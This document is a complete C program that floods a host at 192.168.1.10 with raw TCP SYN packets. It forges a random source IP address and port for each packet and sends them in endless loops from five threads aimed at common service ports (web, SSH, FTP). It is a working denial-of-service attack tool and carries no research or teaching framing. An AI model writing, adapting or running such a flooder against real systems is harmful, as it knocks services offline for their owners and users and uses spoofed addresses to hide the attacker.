#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>

volatile sig_atomic_t quit_flag = 0;

void sigint_handler(int signum) {
    quit_flag = 1;
}

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

typedef struct {
    char ip_address[16];
    unsigned short port;
} realsource;

realsource gensource() {
    realsource spair;
    srand(time(NULL)); // Note: This should ideally be called only once in the main function
    spair.port = rand() % 40000;
    int octet[4];
    for (int i = 0; i < 4; i++) {
        octet[i] = rand() % 256;
    }
    snprintf(spair.ip_address, sizeof(spair.ip_address), "%d.%d.%d.%d", octet[0], octet[1], octet[2], octet[3]);
    return spair;
}

unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return (answer);
}

void *send_tcp_packet(void *arg) {
    unsigned short dport = *(unsigned short *)arg;
    realsource legitsrc = gensource();
    int sockfd;
    struct sockaddr_in dest_addr;
    char packet[4096];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_header psh;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(dport);
    dest_addr.sin_addr.s_addr = inet_addr("192.168.1.10");

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(54321 + dport);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr(legitsrc.ip_address);
    iph->daddr = dest_addr.sin_addr.s_addr;
    iph->check = csum((unsigned short *)packet, iph->tot_len);

    tcph->source = htons(legitsrc.port);
    tcph->dest = dest_addr.sin_port;
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    memcpy(&packet[sizeof(struct iphdr) + sizeof(struct tcphdr)], &psh, sizeof(struct pseudo_header));
    tcph->check = csum((unsigned short *)(packet + sizeof(struct iphdr)), sizeof(struct tcphdr) + sizeof(struct pseudo_header));

        if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
        perror("Send failed");
        exit(EXIT_FAILURE);
    }

    printf("TCP SYN packet sent from thread to port %d\n", dport);

    close(sockfd);

    return NULL;
}

void *spam(void *arg) {
    unsigned short port = *(unsigned short *)arg;
    while (!quit_flag) {
        send_tcp_packet(&port);
    }
    return NULL;
}

int main() {
    signal(SIGINT, sigint_handler);

    unsigned short open_ports[] = {80, 443, 8080, 22, 21};
    int lengtharray = sizeof(open_ports) / sizeof(open_ports[0]);

    pthread_t threads[lengtharray];

    for (int t = 0; t < lengtharray; t++) {
        printf("Creating thread %d\n", t);
        int rc = pthread_create(&threads[t], NULL, spam, (void *)&open_ports[t]);
        if (rc) {
            printf("ERROR; return code from pthread_create() is %d\n", rc);
            exit(-1);
        }
    }

    for (int t = 0; t < lengtharray; t++) {
        pthread_join(threads[t], NULL);
    }

    printf("All threads completed\n");

    return 0;
}

